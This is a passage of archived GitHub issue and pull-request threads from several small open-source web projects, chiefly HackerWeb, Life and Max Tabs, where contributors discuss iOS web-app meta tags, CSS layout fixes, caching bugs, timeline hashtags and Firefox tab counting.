Judging from how fast the hackerweb home page loads when the content is stale (very fast), my guess is that something in the JS on the webpage is telling chrome that it doesn't need to refresh the content from local storage.  I was trying to find a way to debug/inspect the local storage in chrome mobile but couldn't...
</Body>
    </Comment>
    <Comment>
      <Owner>joelcollinsdc</Owner>
      <Body>Proof i'm not totally crazy.  It always seems to happen in the morning, if that helps.  After the page has been open for an hour or so it seems to fix itself.  (Example, the below pic was taken at 8:30 Central, by 9:30 it was working)

![img_5785](https://cloud.githubusercontent.com/assets/124740/12065736/2c3c3862-afa2-11e5-9ff8-79cb355f1be8.PNG)
</Body>
    </Comment>
  </Issue_795>
  <Issue_796>
    <Repository>hackerweb</Repository>
    <Title>added apple mobile web app capable meta tags</Title>
    <Owner>cheeaun</Owner>
    <Body>Not sure if reasoning for only using the chrome meta tag for mobile web app capable but I added the apple version too so my iOS8 iPhone and iPad will understand that it can be rendered as a native web app when added to the home screen. I understand if this was left out because of the refresh issue when opening a external link and comping back to native web app but for how I use it, it works fine. If this is merged in, I will delete my repository, otherwise, I will keep it in sync so I can use it in native web app mode for myself. Love the app and how clean it is, cheers.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Interesting. So how do you go "back" on iOS8? I'm using iOS9 so can't try it anymore :smile: 

Also, `apple-mobile-web-app-status-bar-style` with `black` doesn't work anymore in iOS9 Mobile Safari :sob: 
</Body>
    </Comment>
    <Comment>
      <Owner>scraymer</Owner>
      <Body>You can never go back in operating systems, apple has made sure of that :wink: However, If you really wanted to test for backwards compatibility, you could always use the xCode simulator on OS X.

As for iOS9, `apple-mobile-web-status-bar-style` will ignore the `content="value"`attribute and will instead use the color of the device. Therefore, if your iOS9 device front colour is white, it will be white background with black text, else black background with white text. The same colour as the startup background when you boot an iOS devices for the background and the same colour of the apple logo for the text.
</Body>
    </Comment>
  </Issue_796>
  <Issue_797>
    <Repository>hackerweb</Repository>
    <Title>Prevents long URLs from breaking the layout.</Title>
    <Owner>cheeaun</Owner>
    <Body>Re: https://github.com/cheeaun/hackerweb/issues/29

This commit changes the `span.link-text` element to a block layout,
which allows us to apply the CSS `text-overflow: ellipsis;` rule to
long URLs. I've also removed the now unnecessary `&lt;br&gt;` tag in the post
template, as block layout elements do not require manual line breaks.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Just wondering how do you test this? I've tried it on Mobile emulation mode in Chrome, it's still kinda breaks the layout :disappointed: 
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>It still pushes the comment button away.

![push-hackerweb](https://cloud.githubusercontent.com/assets/2296/8688199/c5cb2efe-2acb-11e5-8bf5-fe27d4237f18.png)
</Body>
    </Comment>
    <Comment>
      <Owner>dreger</Owner>
      <Body>Hmm... I only made changes to the `hw-ios-*.css` files, so it might be breaking because I'm not catching the non-iOS `hw-web.css` stylesheet - which I can fix. I think things are fixed for iOS browsers, however: 

&lt;img width="333" alt="screen shot 2015-07-14 at 9 53 09 pm" src="https://cloud.githubusercontent.com/assets/1388077/8689234/fdb4afb0-2a72-11e5-9b8b-60bc696f9f31.png"&gt;
</Body>
    </Comment>
  </Issue_797>
  <Issue_798>
    <Repository>hackerweb</Repository>
    <Title>Added "apple-" prefix to "-mobile-web-app-capable meta tag"</Title>
    <Owner>cheeaun</Owner>
    <Body>Added "apple-" prefix to "-mobile-web-app-capable meta tag" as it was missing. See https://developer.apple.com/library/safari/documentation/AppleApplications/Reference/SafariHTMLRef/Articles/MetaTags.html for valid tags.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Two things:
1. `mobile-web-app-capable` was meant only for Chrome mobile 90fc0373fb28f8869f251f1d9001fbba7b5e7e6d. I realise that the link in the commit message is borked, so here's the updated URL: https://developer.chrome.com/multidevice/android/installtohomescreen
2. `apple-` prefix is not added **on purpose** because it was (and still, I think?) very buggy as it affects lots of things like offline caching, history navigation and external-page linking.

Thanks for the PR, but don't think I'll merge it.

Cheers :smile: 
</Body>
    </Comment>
    <Comment>
      <Owner>shubhadeep</Owner>
      <Body>Thank you.
I did know about the chrome specific meta tag.
Currently testing with the apple prefixed tag on ios 7. Let me see how buggy it is - I can see right away that external page links are launching safari.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@shubhadeep sure :smile: I haven't test it for months now. In fact I added that and removed it since the very first release (~4 years ago?) due to the bugs. I was hesitant to add `mobile-web-app-capable` last year because afraid that Chrome mobile might have the same bugs but turns out okay.
</Body>
    </Comment>
  </Issue_798>
  <Issue_799>
    <Repository>hackerweb</Repository>
    <Title>Find on the page broken on IOS8 Safari</Title>
    <Owner>cheeaun</Owner>
    <Body>When I open the comments and search for a keyword, it doesn't scroll to that keyword.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Looks like this bug is still not fixed in iOS9 (public beta). I've reported the bug via Feedback app. Let's see.
</Body>
    </Comment>
  </Issue_799>
  <Issue_800>
    <Repository>hackerweb</Repository>
    <Title>Load more than 60 posts</Title>
    <Owner>cheeaun</Owner>
    <Body>Currently, when you click the "more" link, the 30 more posts that load don&#8217;t come with another "more" link, so the max number of posts is 60. Was this intentional, or could this potentially be expanded?
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>This is intentional because any "more" links on HN after the first 60 frontpage stories have expiry times, which will stop working (show expired link page) after few minutes.

This could potentially be expanded when HN stops having the expiry times for "more" links :)
</Body>
    </Comment>
  </Issue_800>
  <Issue_801>
    <Repository>hackerweb</Repository>
    <Title>Clicks happen on wrong story</Title>
    <Owner>cheeaun</Owner>
    <Body>When using hackerweb in Firefox OS, clicks will often go to the story above where you clicked on, usually after scrolling
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>May I know which version of Firefox OS that you're using?
</Body>
    </Comment>
    <Comment>
      <Owner>daleharvey</Owner>
      <Body>master, I have seen this on several devices (nexus 4 and new reference device), I dont think its a gecko bug, can debug though
</Body>
    </Comment>
  </Issue_801>
  <Issue_802>
    <Repository>hackerweb</Repository>
    <Title>Keep previous focus when back.</Title>
    <Owner>cheeaun</Owner>
    <Body>Always scroll to top when back from link or comments view.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>May I know which browser/OS does this happen on?
</Body>
    </Comment>
    <Comment>
      <Owner>mait</Owner>
      <Body>when back from comments view, It's. ok. But back from links scroll to top.

android 4.1.2 stock browser.

anyway, thanks for good work. I would like to use hackerweb as rss reader.
2013. 6. 15. &#50724;&#51204; 11:38&#50640; "Lim Chee Aun" notifications@github.com&#45784;&#51060; &#51089;&#49457;:

&gt; May I know which browser/OS does this happen on?
&gt; 
&gt; &#8212;
&gt; Reply to this email directly or view it on GitHubhttps://github.com/cheeaun/hackerweb/issues/19#issuecomment-19490111
&gt; .
</Body>
    </Comment>
    <Comment>
      <Owner>mait</Owner>
      <Body>Same problem with Chromium 29/Ubuntu
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@mait would be great if you could provide more details because I can't seem to reproduce the issue on my Chrome Dev.
</Body>
    </Comment>
    <Comment>
      <Owner>mait</Owner>
      <Body>- scroll down,
- click topic, move to another site and read
- back

chromium reload whole page, didn't keep previous reading position.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@mait oh! Silly me, got your point now. Will be fixing it, thanks :)
</Body>
    </Comment>
    <Comment>
      <Owner>mait</Owner>
      <Body>@cheeaun thanks for quick response! Hackerweb is nice viewer for both phone and desktop.
</Body>
    </Comment>
  </Issue_802>
  <Issue_803>
    <Repository>hackerweb</Repository>
    <Title>Direct link to content in left pane</Title>
    <Owner>cheeaun</Owner>
    <Body>The older (single pane) version of hnmobile used to open links by default. And it offered a second link to the comments. I'd like that sort of behavior in the new version.

Possible ideas:
1. Same as previous version. Title links to content. "n comments" links to comments
2. Create a small url icon/text which links to the content.
3. Offer a forced way to visit the iphone version

Opening the comments first feels weird, because as a reader I have no context for the comments.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>One question, do you open the links in a new tab or just load it in the current tab, when using the single-pane hnmobile (on iPad)?
</Body>
    </Comment>
    <Comment>
      <Owner>captn3m0</Owner>
      <Body>Usually both, since the safari cache was good enough not to cause a refresh on the back button. 

But in most cases, I'd open it on a new tab. If you know someone else who uses this on ipad, please ask there opinions as well. 

If it is implemented as a normal link (`&lt;a href="http://external/"&gt;`), it would respond to a long hold, and would give me an option to open in new tab. You could still intercept a touch event to open it in the side window. 

You know what would be awesome? Using either two-finger touch/swipe for the third action. The following would be my preferences

a) View comments in right pane - tap
b) Open link in new tab - tap
c) Open link in right pane - swipe/two finger touch

This way, if I click on a link, I shift to the content, and on closing that, I reach the comments, which I can read in context now. In the rare case I want to open it in right pane, I have a fallback as well.

Sorry for giving such a long answer when you asked a simple question. I'd be willing to work on this (a/b/c).
</Body>
    </Comment>
  </Issue_803>
  <Issue_804>
    <Repository>hackerweb</Repository>
    <Title>Add apple-mobile-web-app-capable header</Title>
    <Owner>cheeaun</Owner>
    <Body>Adds the `apple-mobile-web-app-capable` header, so that when launched from a homescreen icon it doesn't show the Safari chrome.

You might also want to add a splash screen, it has to be 320x460 then add this:

```
&lt;link rel="apple-touch-startup-image" href="/startup.png"&gt;
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@lucaspiller have you tried using hnmobile with this addition?
</Body>
    </Comment>
    <Comment>
      <Owner>timclipsham</Owner>
      <Body>It is nice in some respects without the chrome and with a splash screen. I also liked the separation it gives in the app switcher.

I was considering the submission of a similar pull request the other day regarding this however after some testing I found I preferred this application inside the Safari browser - it's easier to open a link and then browse back without continually switching between applications. Often enough I'll open something and then decide to not read any further and want to get back to the HN list quickly.
</Body>
    </Comment>
    <Comment>
      <Owner>neersighted</Owner>
      <Body>:+1:, I really want the chrome-less webapp.
</Body>
    </Comment>
    <Comment>
      <Owner>tslmy</Owner>
      <Body>Thumb up here, too.
</Body>
    </Comment>
    <Comment>
      <Owner>lucaspiller</Owner>
      <Body>Hey-ho, a four year old pull request that is neither merged nor closed!

I've rebased against master and also added the header to hide the status bar (I don't like that what is behind is half visible, but I prefer it to the status bar taking up all important real estate).

Since the 'Back' functionality was introduced into iOS, the issues that prevented this being originally merged have been resolved. I have also made a video to appease the masses!

![webapp](http://i.imgur.com/wYX1A7W.gif)

:guardsman: :8ball: :alien: 
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@lucaspiller looks good, knew you would come back to this issue again. Few issues:
1. I think the status bar is still needed :smile: 
2. I think we need to know the version of iOS that start supporting this 'Back' feature and only enable this if it's supported?
</Body>
    </Comment>
    <Comment>
      <Owner>lucaspiller</Owner>
      <Body>Re 2, the 'Back' functionality is supported since iOS 9, [which according to Apple](https://developer.apple.com/support/app-store/) 76% of devices have upgraded to. Do you have any analytics to see how many visitors are running iOS 9?

As this is turned on via a meta tag I don't think there is an easy way to dynamically enable it (except maybe a separate URL). Without the 'Back' functionality, users will have to switch to the task switcher to get back to HackerWeb.
</Body>
    </Comment>
  </Issue_804>
  <Issue_805>
    <Repository>hackerweb-native</Repository>
    <Title>iPhone X support &amp; React Native upgrade</Title>
    <Owner>cheeaun</Owner>
    <Body>First of all, many many thanks for this app. I've been using it intensively on every iPhone I've owned and I always come back to this app. It's one of the first things I install. I got my iPhone X a while ago and hoped someone else would update this app for the iPhone X. Nobody did, so I took it upon myself :) &#13;
&#13;
Addresses issue #14 &#13;
&#13;
* Upgrade React Native to be able to build with latest XCode, required to build for iPhone X. Some packages and components have been deprecated and had to be upgraded.&#13;
&#13;
* I really do not enjoy the hacks put in place for the iPhone X. I had to hard-code the offset from the top because the navbar is taller on iPhone X. This can be more elegantly solved by using `react-navigation`, which takes care of that automatically. However, that would be quite an intensive change.&#13;
&#13;
* I've created more padding at the bottom so that the bumper bar is not overlapping any content.&#13;
&#13;
I understand the iPhone X specific changes are really a hack and I'd really like to implement a more elegant solution. Such solutions would require more dramatic changes, which I do not really feel comfortable doing right now.&#13;
&#13;
![simulator screen shot - iphone x - 2018-06-25 at 11 24 07](https://user-images.githubusercontent.com/5777517/41838814-21012dc0-786a-11e8-912d-5353af917484.png)&#13;
![simulator screen shot - iphone x - 2018-06-25 at 11 24 39](https://user-images.githubusercontent.com/5777517/41838850-33b385e4-786a-11e8-9c18-83c67c24346c.png)&#13;
![simulator screen shot - iphone x - 2018-06-25 at 11 25 05](https://user-images.githubusercontent.com/5777517/41838866-3f297e38-786a-11e8-83da-6cd56ad0bc88.png)&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>russelldavis</Owner>
      <Body>Any reason not to merge this?</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@russelldavis hey! very sorry for this super late reply.&#13;
&#13;
Few reasons:&#13;
- I've been seriously getting out-of-loop from any latest changes in the React Native world.&#13;
- Been rather busy with my other projects (blame myself for not being able to focus on one thing for a long period of time).&#13;
- Also been getting sick a lot for the past few months &#128517;&#13;
- I don't have/use iPhone X so that kinda deters me from updating this a little (I'm still using the current HackerWeb version on my iPhone 8 &#128516; )&#13;
&#13;
However(!), I actually did try upgrading this even before this PR, pretty much did almost everything you did in this PR, except I kind of dislike the (temporary?) hacks. At one point, I thought of giving up the old navigator and use `react-navigation` but that's a huge change itself. As always, changes in non-RN files like `LaunchScreen.xib` and `HackerWeb.xcscheme` always scares me because I have no idea what they do &#128516;&#128516; #rant &#13;
&#13;
Currently I'm in "waiting mode", observing if there's anything new or non-hacky fixes for this project. Personally I wouldn't merge yet but it would great if you could continuously update this (I suppose you're already running a custom-built version of HW on your iPhone?) because this is actually a good reference and strong reminder for me &#128556; </Body>
    </Comment>
    <Comment>
      <Owner>russelldavis</Owner>
      <Body>Thanks for the detailed reply! I'm actually not the author of this PR, just a happy long-time user who recently upgraded to the XS and wanted this to look better there. I'll keep watching here for updates.</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@russelldavis lol, obviously I didn't read the author of PR properly before commenting &#128563; &#128518; Thanks a lot to @Photonios then :D </Body>
    </Comment>
    <Comment>
      <Owner>Photonios</Owner>
      <Body>Hey, author here :)&#13;
&#13;
Sorry it took so long to get back to this. I'll see if I can put in some effort to remove some of the hacks. They are not pretty. &#13;
&#13;
Thanks for looking at it &#128077; &#13;
&#13;
</Body>
    </Comment>
  </Issue_805>
  <Issue_806>
    <Repository>javascript-error-logging</Repository>
    <Title>Sentry can also be self-hosted</Title>
    <Owner>cheeaun</Owner>
    <Body>Looks like Sentry can also be self-hosted: https://docs.sentry.io/server/installation/&#13;
Not sure where to put services, that are hosted and can be self-hosted, too.&#13;
What do you think?</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Perhaps can put another entry in `Self-hosted services` section? &#129300; </Body>
    </Comment>
  </Issue_806>
  <Issue_807>
    <Repository>javascript-error-logging</Repository>
    <Title>FancyTrack</Title>
    <Owner>cheeaun</Owner>
    <Body> Could you please add in some section information about &#13;
FancyTrack - free JavaScript error tracking library&#13;
https://github.com/FancyGrid/FancyTrack</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Is this a JS library or a service?</Body>
    </Comment>
    <Comment>
      <Owner>MikhailTatsky</Owner>
      <Body>JS library</Body>
    </Comment>
  </Issue_807>
  <Issue_808>
    <Repository>kanade</Repository>
    <Title>sidebar disappears below the anime list when a season is selected</Title>
    <Owner>cheeaun</Owner>
    <Body>Happens only on the ipad, looks fine on the desktop. Probably css-related?

Screenshots: 

![screenshot 1](http://i.imgur.com/8pIuB.png)
![screenshot 2](http://i.imgur.com/c5Wog.png)
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Should be fixed now in 80505475dbee81dc9339d9f6bbaa2e64999e480e . You probably can try on your iPad again and see :smile:
</Body>
    </Comment>
  </Issue_808>
  <Issue_809>
    <Repository>kyoku</Repository>
    <Title>Windows version?</Title>
    <Owner>cheeaun</Owner>
    <Body>For windows the information is in the system tray?
</Body>
    <State>open</State>
    <Comment>
      <Owner>gutierri</Owner>
      <Body>I think it does not make much sense to have Windows version. The Windows window manager is very different from OS X.

What do you think?
</Body>
    </Comment>
  </Issue_809>
  <Issue_810>
    <Repository>life</Repository>
    <Title>The end of a date range should not be inclusive</Title>
    <Owner>cheeaun</Owner>
    <Body>If I make an event that spans 1990-1993, and another that spans 1993-1994, I would expect those not to overlap.

However, the current implementation interprets these ranges as:

```
    Jan 1, 1990 - Dec 31, 1993 and
    Jan 1, 1993 - Dec 31, 1994. 
```

Thus they overlap by a year.

Wouldn't it be more appropriate to interpret it as:

```
    Jan 1, 1990 - Dec 31, 1992 and
    Jan 1, 1993 - Dec 31, 1993. 
```
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>This was discussed in #9 . My reasons were explained in that thread.
</Body>
    </Comment>
  </Issue_810>
  <Issue_811>
    <Repository>life</Repository>
    <Title>Themes?</Title>
    <Owner>cheeaun</Owner>
    <Body>I know that Life is meant to be super simple, but looking at the compilation of Lives, it seems like people's Lives could certainly use some more different kinds of flavoring instead of all looking the same; so I created a few themes to share, hopefully to inspire others to theme their own Life and share it with others.
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>To make _Life_ simple, I don't think I'll add themes support, but you're free to host some themes/CSS on your own, perhaps by creating a `life-themes` repo and host the css files for other people to link to, via the `customStylesheetURL` config. This way, you can focus on maintaining your themes and I'll focus on maintaining _Life_.

Once you do that, I'll create a wiki page here to list themes (with screenshots) and obviously, link it from the README :smiley: 
</Body>
    </Comment>
    <Comment>
      <Owner>yanandcoffee</Owner>
      <Body>Sounds great :). I've created a `life-themes` repo for purely themes here: [https://github.com/yanandcoffee/life-themes](https://github.com/yanandcoffee/life-themes)

I may create a Github page for demoing the different themes on one page so it'd be more interactive. Will post back on that soon.
</Body>
    </Comment>
    <Comment>
      <Owner>yanandcoffee</Owner>
      <Body>Live theme demo/skinning available here: http://yanandcoffee.github.io/life-themes/

Theme selector at bottom. There's a slight conflict with the selector and Life's slider, but for demoing purposes, should be okay.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Hey, that's really cool! Regarding the README steps for `How to theme your Life`, I would prefer to simplify that by just editting `config.json` and point `customStylesheetURL` to perhaps `http://kaizora.github.io/life-themes/dist/v1/playful.css`.

So it's one CSS file per theme and pointing to your repo instead of hosting it themselves.
</Body>
    </Comment>
    <Comment>
      <Owner>yanandcoffee</Owner>
      <Body>Thanks! That makes sense. I've updated the README to reflect those changes :).
</Body>
    </Comment>
    <Comment>
      <Owner>Oxicode</Owner>
      <Body>Wow. Its cool :+1: 
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@kaizora you could actually put your sass/scss files and build files in your repo too :wink:

I'll be linking to your themes soon. Thanks!
</Body>
    </Comment>
    <Comment>
      <Owner>yanandcoffee</Owner>
      <Body>@cheeaun :smile: Uploaded! 
No rush :). And thanks to you for creating such a neat tool.
</Body>
    </Comment>
  </Issue_811>
  <Issue_812>
    <Repository>life</Repository>
    <Title>Add horizontal scrollwheel (no jQuery)</Title>
    <Owner>cheeaun</Owner>
    <Body>Based on #19, keeping this branch for posterity.
</Body>
    <State>open</State>
    <Comment>
      <Owner>chirag64</Owner>
      <Body>Hi, you both have been working on this for quite some time now. I should've seen your issue #19 before starting my own (#37) . I worked hard on mine, but @rileyjshaw's implementation seems to work better than mine (bummer for me).
</Body>
    </Comment>
  </Issue_812>
  <Issue_813>
    <Repository>life</Repository>
    <Title>Allow for tags/hashtags, e.g. #job (updated)</Title>
    <Owner>cheeaun</Owner>
    <Body>This simple modification will allow for optional tags by adding it at the end of your event, like so:

``` md
@USERNAME's life
===============

- 24/02/1955 Born
- ~1968 Summer job #job
- 03/1976 Built a computer #life #job
- 01/04/1976 Started a [company](http://en.wikipedia.org/wiki/Apple_Inc. "Apple Inc.") #job
- 04/1976-2011 Whole bunch of interesting events
```

These can then be easily styled with a custom css:

``` css
#life .event.tag-school .time {
    border: 4px solid #1abc9c;
}

#life .event.tag-job .time {
    border: 4px solid #3498db;
}
```

To see this working, I have it running myself currently and works like a charm:
http://timeline.owens.nl/
</Body>
    <State>open</State>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>I think the `[]` syntax might be confusing since it's a bit like links. A better option would be a `#hashtag` which then an event could have multiple hashtags?
</Body>
    </Comment>
    <Comment>
      <Owner>michaelowens</Owner>
      <Body>That is a legitimate suggestion. Would you want the hashtags to be visible as well on the timeline, or should it remove them?
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Making it visible would be good, which later can be made into a clickable link to _filter_ events by that tag (or even multiple tags?). I'm considering this to be a better solution to #4 , being more useful and flexible than normal categories/groups.
</Body>
    </Comment>
    <Comment>
      <Owner>michaelowens</Owner>
      <Body>Alright, I'll have a go at that. 
</Body>
    </Comment>
    <Comment>
      <Owner>michaelowens</Owner>
      <Body>Alright, I added hashtags and they're configurable by setting "hideTags". By default they are shown.

(also added a gitignore for IDE settings and the non-example config files) @cheeaun 
</Body>
    </Comment>
    <Comment>
      <Owner>michaelowens</Owner>
      <Body>Also, 2 more things I noticed:
- Spaces are converted to &amp;nbsp; so multiple hashtags after each other might 'cause a lot of spaces. Add something like a trim?
- Currently I add the tags as class to the `.time` div. Should I put it on `.event` in stead?
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>- I don't think you need to trim them. When rendered in the browser, the spaces are ignored/collapsed anyway.
- Add the tag classes to `.event`. And prepend the classes with `tag-`, just in case someone create a `#event` hashtag :smirk: 
</Body>
    </Comment>
    <Comment>
      <Owner>michaelowens</Owner>
      <Body>Alright, prepended with `tag-` and added to the `.event`-div. Once again it's running on my timeline to see it working: http://timeline.owens.nl

The CSS then e.g. looks like:

``` css
#life .event.tag-school .time {
    border: 4px solid #1abc9c;
}

#life .event.tag-job .time {
    border: 4px solid #3498db;
}
```
</Body>
    </Comment>
    <Comment>
      <Owner>michaelowens</Owner>
      <Body>@CharlesLirsac we could add a config to the new solution here to have colors in the config file rather than a custom css? That way we have the hashtags as mentioned above (better syntax than square brackets) and easier to configure.
</Body>
    </Comment>
    <Comment>
      <Owner>lirsacc</Owner>
      <Body>@michaelowens Yes that's exactly what I meant, but as I am now using the old syntax with brackets so I wanted to wait for your code to be merged and then update accordingly, sorry if I wasn't clear. (I don't really care if it's here or in a separate PR)

The custom css remark was just to say that if we want to customize tags with more than just color, a custom css file might be better suited than complicating the config file.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@CharlesLirsac there is already a custom stylesheet option.
</Body>
    </Comment>
    <Comment>
      <Owner>lirsacc</Owner>
      <Body>@cheeaun I know, that's my point : with the tags implemented, using the custom stylesheet seems a better solution for customization (compared to adding stuff to the config and js rendering process), though color is simple enough to be built-in
</Body>
    </Comment>
    <Comment>
      <Owner>thomasschmit</Owner>
      <Body>Is it possible to merge these commits?
</Body>
    </Comment>
    <Comment>
      <Owner>evaryont</Owner>
      <Body>Another vote to see this included. @michaelowens do you have time to rebase this on latest master?
</Body>
    </Comment>
  </Issue_813>
  <Issue_814>
    <Repository>life</Repository>
    <Title>added groupings by markdown headings</Title>
    <Owner>cheeaun</Owner>
    <Body>#4 wanted groupings by different types of events (and so do I!).  This code allows you to group things by using markdown headers.

I would like to add some more stylistic things (have the headers be fixed for x-scroll but scroll for y-scroll) and some stylistic things, but I'm not quite sure how to do that without adding jquery as a dependency (which I don't want to do!).
</Body>
    <State>open</State>
    <Comment>
      <Owner>popomore</Owner>
      <Body>Great!
</Body>
    </Comment>
    <Comment>
      <Owner>justinthiele</Owner>
      <Body>Excited for this one to get merged in.
</Body>
    </Comment>
    <Comment>
      <Owner>mynameisfiber</Owner>
      <Body>@cheeaun sorry for the delay!  I think my modifications are done... what do you think?
</Body>
    </Comment>
    <Comment>
      <Owner>clawoflight</Owner>
      <Body>@cheeaun Any news on this? I would love to have it!
</Body>
    </Comment>
  </Issue_814>
  <Issue_815>
    <Repository>life</Repository>
    <Title>Use real Markdown parsing</Title>
    <Owner>cheeaun</Owner>
    <Body>Some people might be confused by the markdown syntax and later realized that it's not parsed that way.
</Body>
    <State>open</State>
    <Comment>
      <Owner>umazalakain</Owner>
      <Body>Wouldn't `yaml` be more appropriate? You get automatic parsing for free, it's a quite readable syntax and, because it's a hierarchical structure, you can later on add more metadata easily.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>I just feel more comfortable writing in Markdown :) Currently, my plan is to add a simple way of linkifying text so that people can just type:

```
04/09/1998 - [Google is founded](http://google.com/)
```
</Body>
    </Comment>
    <Comment>
      <Owner>umazalakain</Owner>
      <Body>I admit that Markdown is far more readable but then again, you couldn't add more data (i.e. descriptions) to items.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>Adding more (meta)data is tempting but making is super simple is my priority for now.

Adding description could be something like this:

```
- 04/09/1998 - [Google is founded](http://google.com/)

  &gt; Google was founded by Larry Page and Sergey Brin while they were Ph.D. students at Stanford University.
```
</Body>
    </Comment>
    <Comment>
      <Owner>umazalakain</Owner>
      <Body>Hm, could be! Neat project btw, it certainly comes handy.
</Body>
    </Comment>
  </Issue_815>
  <Issue_816>
    <Repository>max-tabs</Repository>
    <Title>support multiple tab-closing modes</Title>
    <Owner>cheeaun</Owner>
    <Body>- last opened (current behaviour)
- least frequently used tab
- least recently used tab
</Body>
    <State>open</State>
    <Comment>
      <Owner>quarterto</Owner>
      <Body>(also includes a fix for a `window is undefined` error i was seeing)
</Body>
    </Comment>
  </Issue_816>
  <Issue_817>
    <Repository>max-tabs</Repository>
    <Title>major rewrite, fixes #16 and #17</Title>
    <Owner>cheeaun</Owner>
    <Body>- feature #17 is not complete
  - needs to set up hooks to update counters on pinned/unpinned events
- code tested on FF 39.0
</Body>
    <State>open</State>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>Hi!

I tested on 41.0a and the tab moved to the new window isn't being focused. Doesn't the window need to be activated too? Or is it a Firefox Alpha bug?
</Body>
    </Comment>
    <Comment>
      <Owner>rindeal</Owner>
      <Body>It does and it is not. I've also noticed this behaviour. Also there seems to be a bug which causes the counter to reach one tab above limit. I don't have enough time to dig into it now, but I'll try it this weekend.
</Body>
    </Comment>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>Hi!

I'm testing and... It's annoying to have to wait until the page to completely load before the tab to be "moved". However, I can't figure anything different from a loop on setTimeout, but I'm afraid of performance issues.
</Body>
    </Comment>
    <Comment>
      <Owner>rindeal</Owner>
      <Body>Hi,

[docs](https://developer.mozilla.org/en-US/Add-ons/SDK/High-Level_APIs/tabs#readyState) clearly say that URL of tab is known only after the tab entered "ready" state. And as I stated in comments in the code, unless you want to implement the low level stuff to enable true moving of tabs, this is the only way of doing it, AFAIK (however, I don't know too far in this field).

BTW, which loop do you mean @robsonsobral?
</Body>
    </Comment>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>I'm sorry! I mean [`setInterval`](https://developer.mozilla.org/en-US/docs/Web/API/WindowTimers/setInterval).

I was thinking on to use the `open()` event and keep checking until `tab.readyState == "interactive"`, instead of wait until it's `complete`.
</Body>
    </Comment>
    <Comment>
      <Owner>rindeal</Owner>
      <Body>Wow, there was an error in Matrix! I'd swear that yesterday the sentence was `Once a tab's readyState has entered "complete", you can ...`. All right, then I think polling interval of ~300-500ms shouldn't have much impact on performance.
</Body>
    </Comment>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>Hi! I've testing this branch and found a bug. If the new tab is just a file, like `domain.com/file.jpg`, it isn't moved.

Maybe it's best to use setInterval until the URl of the tab become available.
</Body>
    </Comment>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>One more issue: the moved tab isn't integrated into history. It doesn't appears on "recent closed tabs" and sometimes just doesn't keep its url after reload.

It looks like this idea isn't easy to implemented after all.
</Body>
    </Comment>
  </Issue_817>
  <Issue_818>
    <Repository>max-tabs</Repository>
    <Title>tab count does not update on unfocused tab closing</Title>
    <Owner>cheeaun</Owner>
    <Body>Hi!

I don't even know if it's possible to fix this.

If we close a tab using middle click or right click menu, the number of opened tabs isn't updated.

Thanks!
</Body>
    <State>open</State>
    <Comment>
      <Owner>rindeal</Owner>
      <Body>Cannot reproduce
</Body>
    </Comment>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>@rindeal , hi!

I just tested again and I was able to reproduce the error. With 24 tabs, I middle clicked on a tab I'm not in and the number on toolbar is still 24. After I click on any tab, the number updates: 23.

Have you tried on an unfocused tab?

## steps to reproduce
- open more than one tab
- close the unfocused tab by middle click or context right click menu

## system
- Windows 8.1
- Firefox 41.0a2
</Body>
    </Comment>
    <Comment>
      <Owner>rindeal</Owner>
      <Body>Hi,

yeah I tried, but since I use stable firefox (39.0), it works flawlessly.
</Body>
    </Comment>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>Let's put it on hold to see what happens, then.
</Body>
    </Comment>
    <Comment>
      <Owner>cheeaun</Owner>
      <Body>@rindeal thanks for confirming that. Makes my work easier :smiley: 

@robsonsobral I'm using Firefox 41.0a2 and **able** to reproduce this bug. However, honestly I would prefer to fix bugs that only exists on stable versions of Firefox. Beta or dev versions are always kinda flaky :wink: Thanks.
</Body>
    </Comment>
    <Comment>
      <Owner>robsonsobral</Owner>
      <Body>As I said, let's wait to see what happens.

---

